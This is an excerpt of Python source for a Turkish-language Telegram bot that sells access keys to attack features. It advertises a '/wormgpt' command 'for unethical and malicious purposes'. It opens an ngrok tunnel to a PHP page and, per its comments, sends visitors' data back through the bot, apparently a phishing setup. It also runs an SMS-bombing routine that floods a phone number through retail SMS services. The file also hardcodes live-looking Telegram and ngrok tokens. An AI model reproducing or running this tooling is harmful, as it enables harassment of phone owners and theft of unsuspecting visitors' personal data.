...
TELEGRAM_TOKEN = '6848196705:AAFtYkmOk5L7y4x_TeJcBR4h4HbuPsAnyA8'
    ...
    with open("kullanicilar.txt", "r") as file:
        for line in file:
            ...
            try:
                ...
                print(f"{user_id} ID'li kullanıcıya mesaj gönderilemedi: {e}")
...
def handle_demo_key_request(message):
    ...
    if status == "yok":
        ...
        bot.reply_to(message, "Deneme KEY'inin 1 Hafta Süresi Doldu!\nUcuz Fiyata Key Almak İstersen Admine Yaz \n@Tekn0Droid")
...
┃➥ 👹 /wormgpt - Etik Olmayan Ve Kötü Amaçlar İçin
...
# Diğer fonksiyonlarınızın tanımları...
...
def setup(site, chat_id):
    ...
    # Ngrok auth token'ınızı buraya girin
    ngrok.set_auth_token("2ePreLfvkEVMLikiN55kkQjpIf4_3WRheGomi1HvQSExdQyKD")
    
    # Ngrok ile PHP sunucusu için bir tünel oluştur
    http_tunnel = ngrok.connect(8080)
    bot.send_message(chat_id, f'\n[~] Link: {http_tunnel.public_url}')
    
    # Linke birisi girdiğinde ve dosyalar oluştuğunda, kullanıcı verilerini oku ve Telegram botu aracılığıyla gönder
    while True:
...
def smsbomb_isleyici(mesaj):
    try:
        ...
        tel_no = argumanlar[1]
        mesaj_sayisi = int(argumanlar[2])
        if len(tel_no) == 10 and tel_no[0] == '5' and mesaj_sayisi > 0:
            gonderim_baslat(tel_no, mesaj_sayisi, 500, mesaj) # Burada calisan_sayisi değerini isteğinize göre ayarlayın.
        else:
...
def site_ip_bul(site):
    try:
        ...
        print(f"Site IP'si bulunurken hata: {e}")
        return None
...
def gonderim_baslat(tel_no, mesaj_sayisi, calisan_sayisi, mesaj):
    global toplam_gonderimler, basarili_gonderimler, basarisiz_gonderimler
    toplam_gonderimler = 0
    basarili_gonderimler = 0
    basarisiz_gonderimler = 0
    
    # Servis fonksiyonlarınızı bir liste olarak buraya ekleyin.
    # Örnek: servis_listesi = [a101, bim, ...]
    servis_listesi = [a101, bim] # Bu kısmı kendi servislerinizle güncelleyin
        
    random.shuffle(servis_listesi)
    
    baslangic_zamani = int(time.perf_counter())
    ...
    bot.reply_to(mesaj, f"Bu Numaraya;\n{tel_no} SMS Bombası Gönderimi Tamamlandı!\n\n{toplam_gonderimler} SMS, \n{sure} saniye içerisinde gönderildi. \n\nGönderilen SMS'ler;\n{basarili_gonderimler} başarılı, {basarisiz_gonderimler} başarısız.\n")
